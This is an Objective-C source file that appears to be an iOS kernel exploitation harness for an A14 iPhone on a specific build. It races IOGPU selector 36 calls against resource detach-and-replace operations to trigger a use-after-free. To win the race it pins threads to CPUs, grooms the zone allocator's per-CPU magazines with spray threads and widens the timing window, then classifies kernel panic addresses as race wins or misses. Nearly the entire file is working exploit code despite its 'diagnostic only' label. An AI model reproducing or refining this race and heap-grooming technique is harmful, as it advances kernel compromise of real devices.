//
//  P017ConfusedDeputy.m
//  P007OpenOnly
//
//  fix16: Stabilized magazine + slower A (widen fn4 window)
//  Target: iPhone13,2 A14 iOS 26.5/23F77
//
//  RACE (fix16):
//    CPU_A (tag 1): A = continuous sel36 → fn4 → ldr [SysMemory+0x90] → taggedRetain(P)
//                   A has 750-cycle spin after each sel36 to widen fn4 window
//    CPU_B (tag 2): B = detach+replace (zfree P) + 5-syscall pre-position + 1-syscall reclaim
//                   C = 2 threads of continuous create+drop (magazine cycling on CPU_B)
//
//    A and B are CONCURRENT on different CPUs.
//    B and C are on the SAME CPU (same magazine for reclaim).
//
//    For cd8: B's zfree(P) + C/B reclaim must complete before A's taggedRetain(P).
//    A's fn4 window (~10-20µs) widened by 750-cycle spin (~3µs).
//    B's reclaim (1 syscall ~1-5µs) should fit.
//
//  MAGAZINE MECHANICS:
//    zfree → push to same-CPU free half (LIFO)
//    If free full → SWAP (free→alloc, alloc→free), then push
//    zalloc → pop from same-CPU alloc half (LIFO)
//    If alloc empty → go to zone (or depot)
//
//  NOT KRW. Diagnostic only. Panic = race won (classify PC).
//

#import "P017ConfusedDeputy.h"
#import "LabLocalTime.h"
#import "LabDeviceProfile.h"
#import "A14_23F77_LabOffsets.h"
#import <Metal/Metal.h>
#import <objc/runtime.h>
#import <objc/message.h>
#include <pthread.h>
#include <mach/mach.h>
#include <mach/thread_policy.h>
#include <mach/thread_switch.h>
#include <mach/vm_map.h>
#include <dlfcn.h>
#include <errno.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdarg.h>
#include <time.h>
#include <stdatomic.h>

typedef kern_return_t (*p017_iocall_t)(
    mach_port_t, uint32_t,
    const uint64_t *, uint32_t,
    const void *, size_t,
    uint64_t *, uint32_t *,
    void *, size_t *);
typedef uint32_t (*p017_getconn_t)(void *);
typedef int (*p017_detach_t)(void *);
typedef int (*p017_replace_t)(void *, void *, uint64_t);
typedef uint32_t (*p017_gettype_t)(void *);

static p017_iocall_t   p017_iocall = NULL;
static p017_getconn_t  p017_dev_conn_fn = NULL;
static p017_detach_t   p017_detach_fn = NULL;
static p017_replace_t  p017_replace_fn = NULL;
static p017_gettype_t  p017_gettype_fn = NULL;

// ═══════════════════════════════════════════════════════════════
// VERIFIED 23F77 CONSTANTS
// ═══════════════════════════════════════════════════════════════

#define P017_SEL36              A14_23F77_IOGPU_SEL36
#define P017_SEL36_SCIN         A14_23F77_IOGPU_SEL36_SCIN
#define P017_SEL36_SCOUT        A14_23F77_IOGPU_SEL36_SCOUT
#define P017_RES_TYPE           A14_23F77_IOGPU_RES_TYPE_BYTES
#define P017_RES_SIZE           A14_23F77_IOGPU_RES_SIZE
#define P017_SEL36_LEN          A14_23F77_IOGPU_SEL36_LEN
#define P017_RACE_SEC           60
#define P017_REPORT_MS          100
#define P017_ITER_FLUSH_MASK    0xff
#define P017_AFFINITY_TAG_A     2   /* A: sel36 victim — CPU_A */
#define P017_AFFINITY_TAG_B     2   /* B: freer + C: spray — CPU_B */
#define P017_NUM_SPRAY_THREADS  2   /* FIX16: 2 C threads for magazine cycling */
#define P017_MAG_CAP            A14_23F77_ZONE_MAGAZINE_CAP
#define P017_RECLAIM_SPIN       500
#define P017_A_SPIN             750 /* FIX16: A's spin to widen fn4 window */
#define P017_BUILD              "p017v2-fix16-stabilized-magazine"
#ifndef THREAD_AFFINITY_POLICY_COUNT
#define THREAD_AFFINITY_POLICY_COUNT 1
#endif

#define P017_RES_ID_OFF         A14_23F77_IOGPU_RES_ID_OFF
#define P017_RES_DEVW_OFF      A14_23F77_IOGPU_RES_DEVW_OFF
#define P017_DEVW_CONN_OFF      A14_23F77_IOGPU_DEVW_CONN_OFF

// ═══════════════════════════════════════════════════════════════
// STATE
// ═══════════════════════════════════════════════════════════════

static FILE *p017_fp = NULL;
static volatile int p017_stop = 0;
static volatile int p017_race_start = 0;

static id<MTLDevice> p017_mtl_device = nil;
static mach_port_t p017_device_conn = 0;

static id<MTLBuffer> p017_persistent_buf = nil;
static void *p017_persistent_ref = NULL;
static uint32_t p017_res_id = 0;

static void *p017_repl_page = NULL;

static volatile long p017_a_iters = 0;
static volatile long p017_b_iters = 0;
static volatile long p017_c_iters = 0;
static volatile int p017_a_errs = 0;
static volatile int p017_b_errs = 0;
static volatile int p017_c_errs = 0;
static mach_port_t p017_thread_a_port = MACH_PORT_NULL;

// ═══════════════════════════════════════════════════════════════
// LOGGING
// ═══════════════════════════════════════════════════════════════

static void p017_log_sync(void) {
    if (!p017_fp) return;
    fflush(p017_fp);
    int fd = fileno(p017_fp);
    if (fd >= 0) fcntl(fd, F_FULLFSYNC);
}

static void p017_log(NSString *fmt, ...) NS_FORMAT_FUNCTION(1,2);
static void p017_log(NSString *fmt, ...) {
    if (!p017_fp) {
        NSString *docs = [NSSearchPathForDirectoriesInDomains(
            NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
        NSString *path = [docs stringByAppendingPathComponent:
            @"p017_confused_deputy_log.txt"];
        p017_fp = fopen(path.UTF8String, "w");
        if (p017_fp) {
            setvbuf(p017_fp, NULL, _IONBF, 0);
            fprintf(p017_fp, "=== p017 v2 session %s build=%s ===\n",
                    LabLocalMilitaryNow().UTF8String, P017_BUILD);
            p017_log_sync();
        }
    }
    va_list ap; va_start(ap, fmt);
    NSString *msg = [[NSString alloc] initWithFormat:fmt arguments:ap];
    va_end(ap);
    if (p017_fp) {
        fprintf(p017_fp, "%s\n", msg.UTF8String);
        p017_log_sync();
    }
    NSLog(@"p017 %@", msg);
}

static void p017_log_rate(NSString *fmt, ...) NS_FORMAT_FUNCTION(1,2);
static void p017_log_rate(NSString *fmt, ...) {
    static int rate_n = 0;
    if (!p017_fp) return;
    va_list ap; va_start(ap, fmt);
    NSString *msg = [[NSString alloc] initWithFormat:fmt arguments:ap];
    va_end(ap);
    fprintf(p017_fp, "%s\n", msg.UTF8String);
    if ((++rate_n % 10) == 0)
        p017_log_sync();
    else
        fflush(p017_fp);
}

// ═══════════════════════════════════════════════════════════════
// THREAD POLICY — affinity tag parameter for split CPU
// ═══════════════════════════════════════════════════════════════

static void p017_set_thread_policy_tag(int tag) {
    thread_affinity_policy_data_t aff_policy;
    aff_policy.affinity_tag = tag;
    thread_policy_set(mach_thread_self(),
                      THREAD_AFFINITY_POLICY,
                      (thread_policy_t)&aff_policy,
                      THREAD_AFFINITY_POLICY_COUNT);
    pthread_set_qos_class_self_np(QOS_CLASS_USER_INTERACTIVE, 0);
}

// ═══════════════════════════════════════════════════════════════
// METAL / IOGPU HELPERS
// ═══════════════════════════════════════════════════════════════

static id p017_unwrap(id obj) {
    for (int i = 0; i < 8; i++) {
        NSString *cn = NSStringFromClass([obj class]);
        if (![cn containsString:@"Capture"] && ![cn containsString:@"Debug"]) break;
        SEL s = NSSelectorFromString(@"baseObject");
        if (![obj respondsToSelector:s]) break;
        id b = ((id (*)(id, SEL))objc_msgSend)(obj, s);
        if (!b || b == obj) break;
        obj = b;
    }
    return obj;
}

static void *p017_strip(void *p) {
    return (void *)((uintptr_t)p & 0x0000007FFFFFFFFFULL);
}

static int p017_is_heap(void *p) {
    uintptr_t x = (uintptr_t)p017_strip(p);
    if (x < 0x100000000ULL) return 0;
    if ((x & 7) != 0) return 0;
    if ((x >> 28) == 0x16) return 0;
    return 1;
}

static void *p017_ivar(id obj, const char *name) {
    if (!obj || !name) return NULL;
    Class cls = object_getClass(obj);
    while (cls) {
        unsigned int n = 0;
        Ivar *ivs = class_copyIvarList(cls, &n);
        void *val = NULL;
        for (unsigned i = 0; i < n; i++) {
            const char *nm = ivar_getName(ivs[i]);
            if (nm && strcmp(nm, name) == 0) {
                val = *(void **)((char *)(__bridge void *)obj + ivar_getOffset(ivs[i]));
                break;
            }
        }
        free(ivs);
        if (val) return val;
        cls = class_getSuperclass(cls);
    }
    return NULL;
}

static void *p017_ref(id buf) {
    buf = p017_unwrap(buf);
    SEL s = NSSelectorFromString(@"resourceRef");
    if (![buf respondsToSelector:s]) return NULL;
    return ((void *(*)(id, SEL))objc_msgSend)(buf, s);
}

static uint32_t p017_res_id_from(void *res) {
    if (!res) return 0;
    return *(uint32_t *)((uint8_t *)res + P017_RES_ID_OFF);
}

static uint32_t p017_res_conn_from(void *res) {
    if (!res) return 0;
    void *devw = p017_strip(*(void **)((uint8_t *)res + P017_RES_DEVW_OFF));
    if (!p017_is_heap(devw)) return 0;
    return *(uint32_t *)((uint8_t *)devw + P017_DEVW_CONN_OFF);
}

static int p017_setup_metal(void) {
    if (!p017_iocall) {
        void *iokit = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
        p017_iocall = iokit ? (p017_iocall_t)dlsym(iokit, "IOConnectCallMethod") : NULL;
    }
    if (!p017_iocall) {
        p017_log(@"[setup] dlsym IOConnectCallMethod FAILED");
        return -1;
    }

    void *iogpu = dlopen("/System/Library/PrivateFrameworks/IOGPU.framework/IOGPU", RTLD_LAZY);
    if (!iogpu) iogpu = dlopen("/System/Library/Frameworks/IOGPU.framework/IOGPU", RTLD_LAZY);
    if (!iogpu) {
        p017_log(@"[setup] dlopen IOGPU FAILED");
        return -1;
    }
    p017_dev_conn_fn = (p017_getconn_t)dlsym(iogpu, "IOGPUDeviceGetConnect");
    p017_detach_fn   = (p017_detach_t)dlsym(iogpu, "IOGPUResourceDetachBacking");
    p017_replace_fn  = (p017_replace_t)dlsym(iogpu, "IOGPUResourceReplaceBackingWithBytes");
    p017_gettype_fn  = (p017_gettype_t)dlsym(iogpu, "IOGPUResourceGetResourceType");
    if (!p017_dev_conn_fn || !p017_detach_fn || !p017_replace_fn || !p017_gettype_fn) {
        p017_log(@"[setup] IOGPU syms FAILED");
        return -1;
    }

    p017_mtl_device = MTLCreateSystemDefaultDevice();
    if (!p017_mtl_device) {
        p017_log(@"[setup] MTLCreateSystemDefaultDevice FAILED");
        return -1;
    }
    p017_log(@"[setup] Metal device created");

    id mtlDev = p017_unwrap(p017_mtl_device);
    void *devRef = p017_strip(p017_ivar(mtlDev, "_deviceRef"));
    uint32_t dconn = 0;
    if (p017_is_heap(devRef) && p017_dev_conn_fn)
        dconn = p017_dev_conn_fn(devRef);
    p017_log(@"[setup] _deviceRef=%p heap=%d dconn=%u",
             devRef, p017_is_heap(devRef), dconn);
    p017_device_conn = dconn;
    if (!dconn) {
        p017_log(@"[setup] DeviceGetConnect=0 — will use resource conn after create");
    } else {
        p017_log(@"[setup] IOGPU device conn=%u", (unsigned)p017_device_conn);
    }

    if (!p017_repl_page) {
        vm_address_t pg = 0;
        if (vm_allocate(mach_task_self(), &pg, P017_RES_SIZE, VM_FLAGS_ANYWHERE) != KERN_SUCCESS || !pg) {
            p017_log(@"[setup] replace-page vm_allocate FAILED");
            return -1;
        }
        memset((void *)pg, 0x43, P017_RES_SIZE);
        p017_repl_page = (void *)pg;
    }

    return 0;
}

static id<MTLBuffer> p017_create_resource(uint32_t *out_id, int verbose) {
    vm_address_t pg = 0;
    if (vm_allocate(mach_task_self(), &pg, P017_RES_SIZE, VM_FLAGS_ANYWHERE) != KERN_SUCCESS || !pg) {
        if (verbose) p017_log(@"[create] vm_allocate FAILED");
        return nil;
    }
    memset((void *)pg, 0x41, P017_RES_SIZE);

    id<MTLBuffer> buf = [p017_mtl_device
        newBufferWithBytesNoCopy:(void *)pg
        length:P017_RES_SIZE
        options:MTLResourceStorageModeShared
        deallocator:^(void *ptr, NSUInteger n) {
            vm_deallocate(mach_task_self(), (vm_address_t)ptr, (vm_size_t)n);
        }];
    if (!buf) {
        if (verbose) p017_log(@"[create] newBufferWithBytesNoCopy FAILED");
        vm_deallocate(mach_task_self(), pg, P017_RES_SIZE);
        return nil;
    }

    void *ref = p017_ref(buf);
    uint32_t typ = (ref && p017_gettype_fn) ? p017_gettype_fn(ref) : 0;
    uint32_t rid = p017_res_id_from(ref);
    uint32_t rconn = p017_res_conn_from(ref);
    if (verbose)
        p017_log(@"[create] type=0x%x id=%u ref=%p rconn=%u", typ, rid, ref, rconn);
    if (!ref || typ != P017_RES_TYPE || !rid) {
        if (verbose) p017_log(@"[create] need type 0x80 + non-zero id");
        return nil;
    }
    if (out_id) *out_id = rid;
    return buf;
}

static void p017_drop_resource(id<MTLBuffer> __strong *buf) {
    if (buf && *buf) {
        if (*buf == p017_persistent_buf)
            p017_persistent_ref = NULL;
        *buf = nil;
    }
}

static kern_return_t p017_sel36(uint32_t id) {
    uint64_t scalars[P017_SEL36_SCIN] = { id, 0, P017_SEL36_LEN };
    uint64_t out = 0;
    uint32_t outCnt = P017_SEL36_SCOUT;

    if (!p017_iocall || !p017_device_conn) return KERN_FAILURE;
    return p017_iocall(
        p017_device_conn,
        P017_SEL36,
        scalars, P017_SEL36_SCIN,
        NULL, 0,
        &out, &outCnt,
        NULL, NULL);
}

static int p017_detach_replace(id<MTLBuffer> buf) {
    (void)buf;
    void *ref = p017_persistent_ref;
    if (!ref && buf) ref = p017_ref(buf);
    if (!ref || !p017_detach_fn || !p017_replace_fn || !p017_repl_page)
        return -1;
    int d = p017_detach_fn(ref);
    int r = p017_replace_fn(ref, p017_repl_page, (uint64_t)P017_RES_SIZE);
    if (d != 0 || r != 0) {
        p017_log(@"[detach+replace] detach=%d replace=%d", d, r);
        return -1;
    }
    p017_persistent_ref = ref;
    return 0;
}

static void p017_park_until_go(void) {
    while (!p017_race_start && !p017_stop)
        (void)thread_switch(MACH_PORT_NULL, SWITCH_OPTION_DEPRESS, 0);
}

static int p017_spawn(pthread_t *th, void *(*fn)(void *), void *arg) {
    pthread_attr_t attr;
    pthread_attr_init(&attr);
    (void)pthread_attr_set_qos_class_np(&attr, QOS_CLASS_USER_INTERACTIVE, 0);
    int e = pthread_create(th, &attr, fn, arg);
    pthread_attr_destroy(&attr);
    return e;
}

static void p017_mag_cycle(void) {
    for (int i = 0; i < (int)P017_MAG_CAP; i++) {
        uint32_t sid = 0;
        id<MTLBuffer> b = p017_create_resource(&sid, 0);
        if (b) p017_drop_resource(&b);
    }
}

// ═══════════════════════════════════════════════════════════════
// THREAD A — CPU_A (tag 1) — continuous sel36 with widened fn4 window
// ═══════════════════════════════════════════════════════════════

static void *p017_thread_a(void *arg) {
    (void)arg;
    p017_set_thread_policy_tag(P017_AFFINITY_TAG_A);  /* CPU_A */
    p017_thread_a_port = mach_thread_self();
    p017_park_until_go();
    if (p017_stop) return NULL;

    long local_iter = 0;
    int local_err = 0;

    while (!p017_stop) {
        kern_return_t kr = p017_sel36(p017_res_id);
        if (kr == 0) local_iter++;
        else         local_err++;

        /* FIX16: Widen fn4 window — 750 cycles (~3µs)
              This gives B more time to reclaim P before A's taggedRetain */
        for (volatile int i = 0; i < P017_A_SPIN; i++) {
            __asm__ __volatile__("" ::: "memory");
        }

        if ((local_iter & P017_ITER_FLUSH_MASK) == 0) {
            p017_a_iters += local_iter;
            p017_a_errs += local_err;
            local_iter = 0;
            local_err = 0;
        }
    }

    p017_a_iters += local_iter;
    p017_a_errs += local_err;
    return NULL;
}

// ═══════════════════════════════════════════════════════════════
// THREAD B — CPU_B (tag 2) — detach+replace + stabilized pre-position
// ═══════════════════════════════════════════════════════════════

static void *p017_thread_b(void *arg) {
    (void)arg;
    p017_set_thread_policy_tag(P017_AFFINITY_TAG_B);  /* CPU_B */
    p017_park_until_go();
    if (p017_stop) return NULL;

    /* Prime THIS cpu's magazine before first replace */
    p017_mag_cycle();

    long local_iter = 0;
    int local_err = 0;
    id<MTLBuffer> held = nil;

    while (!p017_stop) {
        /* 0. STABILIZED PRE-POSITION: 5 create+drop to fill free to 5
              This is more conservative than 7, less magazine disturbance */
        for (int i = 0; i < 5; i++) {
            uint32_t sid = 0;
            id<MTLBuffer> tmp = p017_create_resource(&sid, 0);
            if (tmp) {
                p017_drop_resource(&tmp);
            }
        }

        /* 1. detach+replace: zfree(current MD) inside kernel.
              After this, P is on free half. free should be 6 (5+1). */
        int kr = p017_detach_replace(p017_persistent_buf);
        if (kr != 0) {
            local_err++;
            continue;
        }
        local_iter++;

        /* 2. FAST RECLAIM — 1 syscall only:
              a) hold: zalloc pops from alloc → may get P */
        uint32_t sid = 0;
        held = p017_create_resource(&sid, 0);  /* zalloc → pop P? */

        /* 3. Spin — let A's taggedRetain hit reclaimed P. */
        for (volatile int i = 0; i < P017_RECLAIM_SPIN; i++) {
            __asm__ __volatile__("" ::: "memory");
        }

        if ((local_iter & P017_ITER_FLUSH_MASK) == 0) {
            p017_b_iters += local_iter;
            p017_b_errs += local_err;
            local_iter = 0;
            local_err = 0;
        }
    }

    p017_drop_resource(&held);
    p017_b_iters += local_iter;
    p017_b_errs += local_err;
    return NULL;
}


// ═══════════════════════════════════════════════════════════════
// THREAD C — CPU_B (tag 2) — continuous create+drop
// ═══════════════════════════════════════════════════════════════

static void *p017_thread_c(void *arg) {
    (void)arg;
    p017_set_thread_policy_tag(P017_AFFINITY_TAG_B);  /* CPU_B — SAME as B */
    p017_park_until_go();
    if (p017_stop) return NULL;

    long local_iter = 0;
    int local_err = 0;

    while (!p017_stop) {
        uint32_t spray_id = 0;
        id<MTLBuffer> spray_buf = p017_create_resource(&spray_id, 0);
        if (!spray_buf) { local_err++; continue; }
        p017_drop_resource(&spray_buf);
        local_iter++;

        if ((local_iter & P017_ITER_FLUSH_MASK) == 0) {
            p017_c_iters += local_iter;
            p017_c_errs += local_err;
            local_iter = 0;
            local_err = 0;
        }
    }

    p017_c_iters += local_iter;
    p017_c_errs += local_err;
    return NULL;
}

// ═══════════════════════════════════════════════════════════════
// CALIBRATION
// ═══════════════════════════════════════════════════════════════

static int p017_calibrate(void) {
    p017_log(@"=== p017 v2: fix16 stabilized magazine + slower A ===");
    p017_log(@"[*] A on tag %d (CPU_A), B+C on tag %d (CPU_B)",
             P017_AFFINITY_TAG_A, P017_AFFINITY_TAG_B);
    p017_log(@"[*] A: continuous sel36 → fn4 → ldr P → taggedRetain(P)");
    p017_log(@"[*] A: 750-cycle spin after each sel36 (widen fn4 window)");
    p017_log(@"[*] B: 5 create+drop pre-position + detach+replace + 1-syscall reclaim");
    p017_log(@"[*] C: %d threads of continuous create+drop (magazine cycling on CPU_B)",
             P017_NUM_SPRAY_THREADS);
    p017_log(@"[*] A↔B concurrent (different CPUs); B+C same magazine (same CPU)");
    p017_log(@"[*] NOT KRW. Diagnostic only. Panic = race won (classify PC).");

    if (p017_setup_metal() != 0) {
        p017_log(@"[calib] Metal setup FAILED");
        return -1;
    }

    p017_set_thread_policy_tag(P017_AFFINITY_TAG_A);

    p017_persistent_buf = p017_create_resource(&p017_res_id, 1);
    if (!p017_persistent_buf || p017_res_id == 0) {
        p017_log(@"[calib] Persistent resource create FAILED");
        return -1;
    }
    p017_persistent_ref = p017_ref(p017_persistent_buf);
    if (!p017_persistent_ref) {
        p017_log(@"[calib] Persistent resourceRef FAILED");
        return -1;
    }
    {
        uint32_t dconn = (uint32_t)p017_device_conn;
        uint32_t rconn = p017_res_conn_from(p017_persistent_ref);
        uint32_t conn = dconn ? dconn : rconn;
        p017_device_conn = conn;
        p017_log(@"[calib] Persistent id=%u type=0x%x dconn=%u rconn=%u using=%u",
                 p017_res_id, P017_RES_TYPE, dconn, rconn, conn);
        if (!conn) {
            p017_log(@"[calib] no IOGPU conn");
            return -1;
        }
    }

    kern_return_t kr = p017_sel36(p017_res_id);
    if (kr != 0) {
        p017_log(@"[calib] A sel36 FAILED kr=0x%x", kr);
        return -1;
    }
    p017_log(@"[calib] A sel36 SUCCESS");

    if (p017_detach_replace(p017_persistent_buf) != 0) {
        p017_log(@"[calib] B detach+replace FAILED");
        return -1;
    }
    p017_log(@"[calib] B detach+replace SUCCESS");

    {
        uint32_t sid = 0;
        id<MTLBuffer> b = p017_create_resource(&sid, 0);
        if (!b) {
            p017_log(@"[calib] C spray smoke FAILED");
            return -1;
        }
        p017_drop_resource(&b);
        p017_log(@"[calib] C spray smoke ok");
    }

    kr = p017_sel36(p017_res_id);
    if (kr != 0) {
        p017_log(@"[calib] A sel36-after-replace FAILED kr=0x%x", kr);
        return -1;
    }
    p017_log(@"[calib] A sel36-after-replace SUCCESS — race armed");
    return 0;
}

// ═══════════════════════════════════════════════════════════════
// RACE PHASE
// ═══════════════════════════════════════════════════════════════

static void p017_race(void) {
    p017_stop = 0;
    p017_race_start = 0;
    p017_thread_a_port = MACH_PORT_NULL;
    p017_a_iters = 0;
    p017_b_iters = 0;
    p017_c_iters = 0;
    p017_a_errs = 0;
    p017_b_errs = 0;
    p017_c_errs = 0;

    p017_log(@"[race] START %ds: A=tag%d B+C=tag%d (split CPU, %d C threads)",
             P017_RACE_SEC, P017_AFFINITY_TAG_A, P017_AFFINITY_TAG_B, P017_NUM_SPRAY_THREADS);
    p017_log(@"[race] build=%s  want cd8/d00 (live GMD) not cc8 (freed vt)", P017_BUILD);
    p017_log(@"[race] A↔B concurrent; B+C same magazine; A spin=%d reclaim spin=%d",
             P017_A_SPIN, P017_RECLAIM_SPIN);
    p017_log(@"[race] panic PC class:");
    p017_log(@"[race]   miss  0x%llx (+0xbda8 cc8)", (unsigned long long)A14_23F77_PANIC_CC8);
    p017_log(@"[race]   want  0x%llx (+0xbdb8 retain) / 0x%llx (+0xbde0)",
             (unsigned long long)A14_23F77_PANIC_RETAIN_BLRAA,
             (unsigned long long)A14_23F77_PANIC_RELEASE_BLRAA);

    pthread_t ta, tb, tc[P017_NUM_SPRAY_THREADS];
    p017_spawn(&ta, p017_thread_a, NULL);
    p017_spawn(&tb, p017_thread_b, NULL);
    for (int i = 0; i < P017_NUM_SPRAY_THREADS; i++)
        p017_spawn(&tc[i], p017_thread_c, (void *)(uintptr_t)i);
    p017_race_start = 1;

    const int race_ms = P017_RACE_SEC * 1000;
    for (int t_ms = P017_REPORT_MS; t_ms <= race_ms; t_ms += P017_REPORT_MS) {
        usleep(P017_REPORT_MS * 1000);
        if (p017_stop) break;
        p017_log_rate(@"[race] t=%dms A=%ld B=%ld C=%ld errA=%d errB=%d errC=%d",
                      t_ms, p017_a_iters, p017_b_iters, p017_c_iters,
                      p017_a_errs, p017_b_errs, p017_c_errs);
    }

    p017_stop = 1;
    pthread_join(ta, NULL);
    pthread_join(tb, NULL);
    for (int i = 0; i < P017_NUM_SPRAY_THREADS; i++)
        pthread_join(tc[i], NULL);

    p017_log(@"[race] FINAL A=%ld B=%ld C=%ld errA=%d errB=%d errC=%d",
             p017_a_iters, p017_b_iters, p017_c_iters,
             p017_a_errs, p017_b_errs, p017_c_errs);
    p017_log(@"[race] SURVIVED — check ips if panicked; else race missed");
}

// ═══════════════════════════════════════════════════════════════
// MAIN ENTRY
// ═══════════════════════════════════════════════════════════════

static NSString *p017_return_log(NSString *tag) {
    if (p017_fp) { fflush(p017_fp); fclose(p017_fp); p017_fp = NULL; }
    NSString *docs = [NSSearchPathForDirectoriesInDomains(
        NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
    NSString *path = [docs stringByAppendingPathComponent:
        @"p017_confused_deputy_log.txt"];
    NSString *body = [NSString stringWithContentsOfFile:path
                                               encoding:NSUTF8StringEncoding
                                                  error:nil] ?: @"(no log file)";
    return [NSString stringWithFormat:
            @"=== LIVE TAP %s (%@) ===\n%@\n",
            P017_BUILD, tag, body];
}

@implementation P017ConfusedDeputy

+ (NSString *)tap {
    p017_stop = 1;
    p017_race_start = 0;
    if (p017_fp) { fclose(p017_fp); p017_fp = NULL; }
    p017_drop_resource(&p017_persistent_buf);
    p017_persistent_ref = NULL;
    p017_res_id = 0;
    p017_device_conn = 0;
    p017_mtl_device = nil;
    p017_thread_a_port = MACH_PORT_NULL;
    p017_stop = 0;

    NSString *gate = [LabDeviceProfile stopUnlessA14_23F77:@"p017v2"];
    if (gate) return gate;

    p017_log(@"========================================");
    p017_log(@"BUILD %s (compiled %s %s)", P017_BUILD, __DATE__, __TIME__);
    p017_log(@"fix16: A on tag %d (CPU_A), B+C on tag %d (CPU_B) — split CPU + stabilized magazine",
             P017_AFFINITY_TAG_A, P017_AFFINITY_TAG_B);
    p017_log(@"target: iPhone13,2 A14 26.5/23F77");
    p017_log(@"ABI pins: sel=%u scIn=%u scOut=%u len=0x%x type=0x%x size=0x%x",
             P017_SEL36, P017_SEL36_SCIN, P017_SEL36_SCOUT,
             (unsigned)P017_SEL36_LEN, (unsigned)P017_RES_TYPE, (unsigned)P017_RES_SIZE);
    p017_log(@"");
    p017_log(@"Race shape (fix16 stabilized magazine + slower A):");
    p017_log(@"  CPU_A (tag %d): A = continuous sel36 + 750-cycle spin", P017_AFFINITY_TAG_A);
    p017_log(@"    sel36 → fn4 → ldr [SysMemory+0x90] → taggedRetain(P)");
    p017_log(@"    750-cycle spin widens fn4 window for B's reclaim");
    p017_log(@"  CPU_B (tag %d): B = 5 create+drop + detach+replace + 1-syscall reclaim", P017_AFFINITY_TAG_B);
    p017_log(@"    5 create+drop pre-positions magazine");
    p017_log(@"    zfree(P) → hold (pop P) → spin");
    p017_log(@"  CPU_B (tag %d): C = %d threads of continuous create+drop", P017_AFFINITY_TAG_B, P017_NUM_SPRAY_THREADS);
    p017_log(@"    magazine cycling — helps reclaim timing");
    p017_log(@"");
    p017_log(@"A↔B concurrent (different CPUs). B+C same magazine (same CPU).");
    p017_log(@"For cd8: B zfree(P) + reclaim must beat A's taggedRetain(P).");
    p017_log(@"A's 750-cycle spin widens fn4 window (~3µs extra).");
    p017_log(@"");
    p017_log(@"ips classify (unslid = live - KernelCache_slide):");
    p017_log(@"  miss  PC 0x%llx  (+0xbda8 cc8) — P freed, autda zeroed vt",
             (unsigned long long)A14_23F77_PANIC_CC8);
    p017_log(@"  want  PC 0x%llx  (+0xbdb8 retain) — P reclaimed, live GMD",
             (unsigned long long)A14_23F77_PANIC_RETAIN_BLRAA);
    p017_log(@"  want  PC 0x%llx  (+0xbde0 release) — P reclaimed, live GMD",
             (unsigned long long)A14_23F77_PANIC_RELEASE_BLRAA);
    p017_log(@"========================================");

    if (p017_calibrate() != 0) {
        p017_log(@"=== verdict: CALIB FAILED ===");
        p017_log(@"NOT KRW. Diagnostic only.");
        return p017_return_log(@"calib failed");
    }

    p017_race();

    p017_log(@"=== verdict: SURVIVED race window (or check ips if panicked) ===");
    p017_log(@"note: cc8 = reclaim miss; cd8/d00 = live GMD (race won)");
    p017_log(@"NOT KRW. Diagnostic only.");

    if (p017_persistent_buf) {
        p017_drop_resource(&p017_persistent_buf);
    }
    return p017_return_log(@"finished");
}

@end
